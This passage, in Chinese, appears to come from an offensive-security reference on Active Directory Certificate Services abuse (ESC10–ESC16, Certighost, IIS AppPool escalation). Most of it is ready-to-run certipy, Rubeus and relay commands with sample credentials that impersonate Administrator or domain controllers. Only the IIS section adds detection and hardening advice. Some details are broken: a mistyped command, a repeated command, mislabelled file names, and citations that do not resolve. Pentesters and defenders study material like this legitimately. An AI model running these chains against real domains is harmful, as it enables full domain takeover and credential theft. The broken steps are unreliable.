ESC10 涉及域控制器上的两个注册表键值：

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 下 `CertificateMappingMethods` 的默认值为 `0x18`（`0x8 | 0x10`），此前设置为 `0x1F`。
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 下 `StrongCertificateBindingEnforcement` 的默认设置为 `1`，此前为 `0`。<sup>[[7]](#references)</sup>

**情况 1**

当 `StrongCertificateBindingEnforcement` 配置为 `0` 时。

**情况 2**

如果 `CertificateMappingMethods` 包含 `UPN` 位（`0x4`）。

### 滥用案例 1

当 `StrongCertificateBindingEnforcement` 配置为 `0` 时，具有 `GenericWrite` 权限的账户 A 可被利用来 compromise 任意账户 B。

例如，攻击者对 `Jane@corp.local` 具有 `GenericWrite` 权限，并希望 compromise `Administrator@corp.local`。该过程与 ESC9 类似，因此可以使用任意 certificate template。

首先，利用 `GenericWrite` 通过 Shadow Credentials 获取 `Jane` 的 hash。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
随后，`Jane` 的 `userPrincipalName` 被修改为 `Administrator`，刻意省略 `@corp.local` 部分，以避免违反约束。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
随后，以 `Jane` 的身份使用默认的 `User` 模板请求一个支持客户端身份验证的证书。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` 的 `userPrincipalName` 随后恢复为其原始值 `Jane@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
使用获取的证书进行身份验证将获得 `Administrator@corp.local` 的 NT hash，由于证书中不包含域信息，因此必须在命令中指定域。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 滥用场景 2

当 `CertificateMappingMethods` 包含 `UPN` 位标志（`0x4`）时，拥有 `GenericWrite` 权限的账户 A 可以入侵任何缺少 `userPrincipalName` 属性的账户 B，包括机器账户和内置域管理员 `Administrator`。

这里的目标是入侵 `DC$@corp.local`：首先通过 Shadow Credentials 获取 `Jane` 的 hash，再利用 `GenericWrite`。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` 的 `userPrincipalName` 随后被设置为 `DC$@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
使用默认的 `User` 模板，以 `Jane` 身份请求客户端身份验证证书。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` 的 `userPrincipalName` 会在此过程后恢复为原始值。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
要通过 Schannel 进行身份验证，可使用 Certipy 的 `-ldap-shell` 选项；若显示为 `u:CORP\DC$`，则表示身份验证成功。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
通过 LDAP shell，`set_rbcd` 等命令可启用基于资源的约束委派（RBCD）攻击，从而可能攻陷域控制器。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
此漏洞还会影响任何缺少 `userPrincipalName` 的用户账户，或其 `userPrincipalName` 与 `sAMAccountName` 不匹配的用户账户。默认的 `Administrator@corp.local` 是主要目标，因为它具有较高的 LDAP 权限，且默认情况下不存在 `userPrincipalName`。

## 将 NTLM Relay 到 ICPR - ESC11

### 说明

如果 CA Server 未配置 `IF_ENFORCEENCRYPTICERTREQUEST`，则可以通过 RPC service 在不进行签名的情况下执行 NTLM relay attacks。[Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)。<sup>[[10]](#references)</sup>

你可以使用 `certipy` 枚举 `Enforce Encryption for Requests` 是否已禁用；如果已禁用，certipy 将显示 `ESC11` Vulnerabilities。
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

需要设置一个 relay server：
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注意：对于域控制器，我们必须在 DomainController 中指定 `-template`。

或者使用 [sploutchy's fork of impacket](https://github.com/sploutchy/impacket)：
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## 通过 YubiHSM 获取 ADCS CA 的 Shell access - ESC12

### 解释

管理员可以设置 Certificate Authority，将其存储在类似 "Yubico YubiHSM2" 的外部设备上。

如果 USB 设备通过 USB 端口连接到 CA server，或者在 CA server 为虚拟机的情况下连接到 USB device server，则需要一个 authentication key（有时称为 "password"），供 Key Storage Provider 在 YubiHSM 中生成和使用密钥。

此 key/password 以明文形式存储在注册表中的 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` 下。

参考[此处](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)。<sup>[[11]](#references)</sup>

### Abuse Scenario

如果 CA 的私钥存储在物理 USB 设备上，并且你获得了 shell access，则可以恢复该密钥。

首先，你需要获取 CA certificate（这是公开的），然后：
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最后，使用 certutil `-sign` 命令，利用 CA 证书及其私钥伪造一个新的任意证书。

## OID Group Link Abuse - ESC13

### 说明

`msPKI-Certificate-Policy` 属性允许将颁发策略添加到证书模板中。负责颁发策略的 `msPKI-Enterprise-Oid` 对象可以在 PKI OID 容器的 Configuration Naming Context（CN=OID,CN=Public Key Services,CN=Services）中发现。通过该对象的 `msDS-OIDToGroupLink` 属性，可以将策略链接到 AD 组，从而使系统将出示该证书的用户授权为该组成员。[Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

换句话说，当用户具有注册证书的权限，且该证书链接到某个 OID 组时，该用户可以继承此组的权限。

使用 [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) 查找 OIDToGroupLink：
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

查找用户拥有的权限，可以使用 `certipy find` 或 `Certify.exe find /showAllPermissions`。

如果 `John` 拥有注册 `VulnerableTemplate` 的权限，该用户便可以继承 `VulnerableGroup` 组的权限。

它只需要指定该模板，即可获取一个具有 OIDToGroupLink 权限的证书。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 易受攻击的证书续订配置 - ESC14

### 说明

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping 中的说明非常详尽。以下是原文引用。<sup>[[14]](#references)</sup>

ESC14 关注由“弱显式证书映射”引起的漏洞，主要涉及对 Active Directory 用户或计算机账户的 `altSecurityIdentities` 属性的滥用或不安全配置。此多值属性允许管理员手动将 X.509 证书与 AD 账户关联，以用于身份验证。设置该属性后，这些显式映射可以覆盖默认的证书映射逻辑。默认逻辑通常依赖证书 SAN 中的 UPN 或 DNS 名称，或依赖嵌入在 `szOID_NTDS_CA_SECURITY_EXT` 安全扩展中的 SID。

当 `altSecurityIdentities` 属性中用于标识证书的字符串值范围过宽、容易猜测、依赖非唯一的证书字段，或使用容易伪造的证书组件时，就会产生“弱”映射。如果攻击者能够获取或构造一个证书，其属性符合特权账户的此类弱显式映射，就可以使用该证书以该账户身份进行身份验证和冒充。

潜在的弱 `altSecurityIdentities` 映射字符串示例包括：

- 仅通过常见的 Subject Common Name (CN) 进行映射：例如 `X509:<S>CN=SomeUser`。攻击者可能能够从安全性较低的来源获取具有此 CN 的证书。
- 使用过于通用的 Issuer Distinguished Name (DN) 或 Subject DN，且没有使用特定序列号或主题密钥标识符等进一步限定：例如 `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 使用其他可预测模式或非加密标识符，而攻击者可能能够在其合法获取或伪造的证书中满足这些条件（例如已攻陷 CA，或发现了类似 ESC1 的易受攻击模板）。

`altSecurityIdentities` 属性支持多种映射格式，例如：

- `X509:<I>IssuerDN<S>SubjectDN`（通过完整的 Issuer 和 Subject DN 进行映射）
- `X509:<SKI>SubjectKeyIdentifier`（通过证书的 Subject Key Identifier 扩展值进行映射）
- `X509:<SR>SerialNumberBackedByIssuerDN`（通过序列号进行映射，并隐式由 Issuer DN 限定）——这不是标准格式，通常为 `<I>IssuerDN<SR>SerialNumber`。
- `X509:<RFC822>EmailAddress`（通过 SAN 中的 RFC822 名称进行映射，通常为电子邮件地址）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（通过证书原始公钥的 SHA1 哈希进行映射——通常较为安全）

这些映射的安全性很大程度上取决于映射字符串中所使用证书标识符的具体性、唯一性和加密强度。即使在 Domain Controllers 上启用了强证书绑定模式（其主要影响基于 SAN UPN/DNS 和 SID 扩展的隐式映射），配置不当的 `altSecurityIdentities` 条目仍可能成为直接的冒充路径，因为映射逻辑本身可能存在缺陷或过于宽松。

### 滥用场景

ESC14 针对 Active Directory (AD) 中的**显式证书映射**，具体是 `altSecurityIdentities` 属性。如果设置了此属性（无论是有意设置还是配置错误），攻击者就可以通过出示符合该映射的证书来冒充账户。

#### 场景 A：攻击者可以写入 `altSecurityIdentities`

**前提条件**：攻击者对目标账户的 `altSecurityIdentities` 属性拥有写入权限，或拥有在目标 AD 对象上授予该权限的以下任一权限：
- 写入属性 `altSecurityIdentities`
- 写入属性 `Public-Information`
- 写入属性（全部）
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*。

#### 场景 B：目标通过 X509RFC822（电子邮件）进行弱映射

- **前提条件**：目标在 altSecurityIdentities 中具有弱 X509RFC822 映射。攻击者可以将受害者的 mail 属性设置为与目标的 X509RFC822 名称匹配，为受害者申请证书，然后使用该证书以目标身份进行身份验证。

#### 场景 C：目标具有 X509IssuerSubject 映射

- **前提条件**：目标在 `altSecurityIdentities` 中具有弱 X509IssuerSubject 显式映射。攻击者可以将受害者主体的 `cn` 或 `dNSHostName` 属性设置为与目标 X509IssuerSubject 映射的 subject 匹配。然后，攻击者可以为受害者申请证书，并使用该证书以目标身份进行身份验证。

#### 场景 D：目标具有 X509SubjectOnly 映射

- **前提条件**：目标在 `altSecurityIdentities` 中具有弱 X509SubjectOnly 显式映射。攻击者可以将受害者主体的 `cn` 或 `dNSHostName` 属性设置为与目标 X509SubjectOnly 映射的 subject 匹配。然后，攻击者可以为受害者申请证书，并使用该证书以目标身份进行身份验证。

### 具体操作
#### 场景 A

请求证书模板 `Machine`的证书
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
保存并转换证书
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
进行身份验证（使用证书）
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
清理（可选）
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
对于各种攻击场景中的更具体攻击方法，请参考以下内容：[adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)。<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 说明

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc 中的描述非常详尽。以下是原文摘录。<sup>[[15]](#references)</sup>

使用内置的默认版本 1 证书模板，攻击者可以构造 CSR，以包含优先级高于模板中配置的 Extended Key Usage 属性的应用策略。唯一的要求是拥有 enrollment 权限；利用该方法，可以使用 **_WebServer_** 模板生成客户端身份验证、证书请求代理和代码签名证书。

### 利用

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) 包含更详细的使用示例。<sup>[[14]](#references)</sup>


如果 CA 未打补丁，Certipy 的 `find` 命令可以帮助识别可能容易受到 ESC15 影响的 V1 模板。
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: 通过 Schannel 直接冒充

**Step 1：请求证书，注入“Client Authentication” Application Policy 和目标 UPN。** Attacker `attacker@corp.local` 使用“WebServer” V1 template（允许由申请者提供 subject），以 `administrator@corp.local` 为目标。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: 包含“Enrollee supplies subject”的易受攻击 V1 模板。
- `-application-policies 'Client Authentication'`: 将 OID `1.3.6.1.5.5.7.3.2` 注入 CSR 的 Application Policies 扩展。
- `-upn 'administrator@corp.local'`: 在 SAN 中设置 UPN，以进行冒充。

**Step 2: 使用获取的证书通过 Schannel（LDAPS）进行身份验证。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### 场景 B：通过 Enrollment Agent Abuse 进行 PKINIT/Kerberos Impersonation

**步骤 1：从 V1 template（包含 "Enrollee supplies subject"）请求证书，并注入 "Certificate Request Agent" Application Policy。** 此证书用于让攻击者（`attacker@corp.local`）成为 enrollment agent。此处未为攻击者自身的身份指定 UPN，因为目标是获得 agent capability。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`：注入 OID `1.3.6.1.4.1.311.20.2.1`。

**步骤 2：使用“agent”证书代表目标特权用户请求证书。** 这是类似 ESC3 的步骤，使用步骤 1 中的证书作为 agent 证书。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**步骤 3：使用“on-behalf-of”证书以特权用户身份进行身份验证。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA 上全局禁用安全扩展 - ESC16

### 说明

**ESC16（因缺少 szOID_NTDS_CA_SECURITY_EXT 扩展而导致的权限提升）**指的是以下场景：如果 AD CS 的配置未强制要求在所有证书中包含 **szOID_NTDS_CA_SECURITY_EXT** 扩展，攻击者就可以利用这一点：

1. 请求一个**不带 SID 绑定**的证书。

2. 使用此证书**以任意账户身份进行身份验证**，例如冒充高权限账户（如 Domain Administrator）。

你也可以参考这篇文章，了解其详细原理：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### 利用

以下内容参考了[此链接](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)，点击查看更多详细使用方法。<sup>[[14]](#references)</sup>

要识别 Active Directory Certificate Services（AD CS）环境是否容易受到 **ESC16** 的影响
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**步骤 1：读取受害者账户的初始 UPN（可选 - 用于恢复）。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**步骤 2：将受害者账户的 UPN 更新为目标管理员的 `sAMAccountName`。
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**步骤 3：（如有需要）获取“受害者”账户的凭据（例如通过 Shadow Credentials）。**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**步骤 4：从 _任意适用的客户端身份验证模板_（例如“User”）向存在 ESC16 漏洞的 CA 请求一张证书，并将其作为“victim”用户使用。**由于该 CA 存在 ESC16 漏洞，无论模板对该扩展的具体设置如何，它都会自动从颁发的证书中省略 SID security extension。设置 Kerberos credential cache 环境变量（shell command）：
```bash
export KRB5CCNAME=victim.ccache
```
然后请求证书：
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**步骤 5：还原“victim”账户的 UPN。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**第 6 步：以目标管理员身份进行身份验证。**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### 说明

**Certighost** 滥用 **AD CS enrollment chase / callback path**，其中 CA 信任请求者提供的请求属性，以解析应写入已签发证书的身份。在公开 PoC 中，构造的请求包含：<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**：CA 将连接的、由攻击者控制的主机/IP
- **`rmd`**：用于冒充的**目标 Domain Controller DNS 名称**

如果 CA 遵循该 chase，它将通过 **SMB/LSA (`445`)** 和 **LDAP (`389`)** 连接攻击者。攻击者使用一个**真实的 machine account**（通常通过默认的 **`ms-DS-MachineAccountQuota`** 创建），使 callback session 以有效的 domain principal 进行身份验证，但 rogue services 返回的却是**目标 DC** 的身份属性：

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

如果 CA **没有将返回的身份以 cryptographic 方式绑定到经过身份验证的 callback principal**，它就可能为 **Domain Controller** 签发证书，尽管该 session 实际上是以攻击者控制的 machine account 完成身份验证的。这使该漏洞在概念上不同于 **Certifried**：攻击者不是重写 `dNSHostName` 等 AD attributes，而是**在 CA callback resolution 期间替换身份数据**。<sup>[[2]](#references)</sup>

**有用的前置条件：**

- 低权限的 **domain credentials**
- 能够**创建或复用 computer account**
- CA 能够访问攻击者控制的 **`389` 和 `445` 端口**
- 存在漏洞且未打补丁的 CA request path（**2026 年 7 月 14 日**的 Microsoft update 添加了针对 `cdc` 的 **DC validation** 以及 **resolved-SID comparison**）

随后得到的 **`.pfx`** 可用于 **PKINIT**，生成 **`.ccache`**，并在已发布的 PoC 流程中获取**目标 DC 的 NT hash**；这通常足以实现**完整的 domain compromise**。

### 滥用

公开 PoC 会自动化完整链条：<sup>[[1]](#references)</sup>

1. 创建或复用攻击者控制的 **machine account**。
2. 在 `389` 和 `445` 上启动 **rogue LDAP 和 SMB/LSA listeners**。
3. 提交包含攻击者控制的 **`cdc`** 和目标 **`rmd`** attributes 的 certificate request。
4. 让 CA 以受控 machine account 的身份向 rogue listeners 进行身份验证，但使用**目标 DC** 的 attributes 响应 identity lookups。
5. 接收 CA 签发的 **DC certificate**，然后将其用于 **PKINIT**。
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Useful runtime flags from the PoC：

- `--listener <ip>`：显式选择在 `cdc` 中公布的 callback IP
- `--computer-name <NAME$>`：复用现有 machine account，而不是创建新的 account

**Operational notes：**

- 该 PoC 需要 **root**，因为它会绑定 **privileged ports** `389` 和 `445`。
- 成功 exploitation 后，会在本地写入 **DC `.pfx`** 和 **Kerberos `.ccache`**。
- 由于该 certificate 会映射到 **Domain Controller account**，后续操作可以包括 **certificate-based Kerberos auth**、**DCSync**，以及复用恢复出的 **machine NT hash**。<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment to same-host Administrator

以 `ApplicationPoolIdentity` 运行的 IIS pool 会使用其主机的 **computer account** 访问网络资源。因此，作为 `IIS AppPool\<POOL>` 执行的代码在本地 token 中仍保持低权限，但可以提交一个由 AD CS 处理的 request，而 CA 会将其认证为 `HOST$`；这是一次 outbound identity transition，而不是 token impersonation 或 Potato-style local elevation。<sup>[[19]](#references)[[20]](#references)</sup>

该 chain 要求 IIS 主机已加入 domain、Enterprise CA 可通过 RPC 访问、存在已发布的 machine-authentication template 且该 computer 具有 enrollment rights、支持 PKINIT，并且 KDC/SMB 可达。自定义 pool identity 会改变 outbound principal，因此在假定使用 `HOST$` 之前，应确认该 pool 确实使用 `ApplicationPoolIdentity`。<sup>[[19]](#references)[[20]](#references)</sup>

### Attacker-controlled-key enrollment

在 IIS server 之外生成 key pair 和 CSR，并保留 private key。从被 compromise 的 worker 仅提交 **CSR**。[Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) 会实例化 `CertificateAuthority.Request`，设置 `CertificateTemplate:Machine`，调用 `ICertRequest::Submit`，并返回 issued certificate。使用 CA configuration string `CAHOST\CA-NAME`；普通的 `Machine` template 会根据 AD 构建 subject，因此不需要 requester-supplied subject/SAN data。<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

将返回的 certificate 与**匹配的已保留 key**结合使用。只有当 Windows 已经能够将该 certificate 与可访问的 private key 关联时，`certutil -MergePFX machine_cert.cer machine_cert.pfx` 才能正常工作；对于分离的 PEM files，应显式创建 PKCS#12：<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
使用 PFX 进行 PKINIT，并将返回的计算机 TGT 保持为 base64，而不是立即注入：<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self 加同主机服务替换

S4U2Self 允许服务获取一张**发给自身**的票据，其中包含另一用户的授权数据。使用 computer TGT，Rubeus 可以为一名特权用户请求该票据，将返回的 KRB-CRED 中的服务名称改写为 CIFS，并将其注入。这是本地的“delegate to thyself”原语：不需要 S4U2Proxy，也不需要 `msDS-AllowedToDelegateTo` 条目。<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
替换后的 ticket 只能由**同一计算机账户/密钥**上的服务使用（此处为 `HOST` 上的 CIFS）。它不是可供其他域计算机重复使用的 Administrator ticket。此外，演示结果是具有 Administrator 权限的 SMB/文件系统访问；要获取本地 `NT AUTHORITY\SYSTEM` 进程，仍需要单独的远程执行步骤。<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### 检测与强化

- 在 CA 上，关联 Certification Services 事件 **4886**（收到请求）和 **4887**（已签发），以发现 IIS server 账户发起的异常 `Machine` 模板请求。<sup>[[19]](#references)[[24]](#references)</sup>
- 在 DC 上，当使用 certificate pre-authentication 时，事件 **4768** 会包含证书字段；应针对 web-server 账户发起的异常 PKINIT TGT 请求生成告警。随后检查涉及特权 impersonated identity 以及同一主机的 **4769** 请求。由于 Rubeus `/altservice` 会在客户端重写 KRB-CRED service name，因此不应要求 DC 端的 4769 service name 必须是 `cifs`。<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- 搜索 `w3wp.exe` 访问 CA RPC endpoints、异常创建 ASPX、通过 Kerberos authentication 访问 administrative shares，以及 secrets-dumping 活动。在可能的情况下，限制 app-tier 对 CA RPC/KDC/SMB 的访问，并移除非运营必需的 computer enrollment rights 或 machine-authentication templates。<sup>[[19]](#references)</sup>

## 使用 Certificates Compromising Forests（被动语态说明）

### 通过被 Compromise 的 CAs Breaking Forest Trusts

**cross-forest enrollment** 的配置相对容易完成。resource forest 的 **root CA certificate** 由管理员**发布到 account forests**，resource forest 的 **enterprise CA** certificates 则被**添加到每个 account forest 中的 `NTAuthCertificates` 和 AIA containers**。换言之，此配置使 resource forest 中的 **CA 完全控制其管理 PKI 的所有其他 forests**。如果该 CA 被**攻击者 compromise**，则 resource forest 和 account forests 中所有用户的 certificates 都可能被攻击者**伪造**，从而破坏 forest 的安全边界。<sup>[[6]](#references)</sup>

### 授予 Foreign Principals 的 Enrollment Privileges

在 multi-forest 环境中，对于**发布 certificate templates** 且允许 **Authenticated Users 或 foreign principals**（属于 Enterprise CA 所在 forest 之外的用户/组）拥有 **enrollment 和 edit rights** 的 Enterprise CAs，必须保持谨慎。\
当通过 trust 进行 authentication 时，AD 会将 **Authenticated Users SID** 添加到用户的 token 中。因此，如果某个 domain 拥有一个允许 **Authenticated Users enrollment rights** 的 Enterprise CA template，则来自不同 forest 的用户可能会**enroll 该 template**。同样，如果某个 template 明确向 foreign principal 授予 **enrollment rights**，则会由此创建**跨 forest 的 access-control relationship**，使一个 forest 中的 principal 能够**enroll 另一个 forest 中的 template**。

这两种情况都会导致一个 forest 到另一个 forest 的**attack surface 增加**。攻击者可能利用 certificate template 的设置，在 foreign domain 中获得额外 privileges。<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, New Authentication and Request Methods and more](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – The Tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
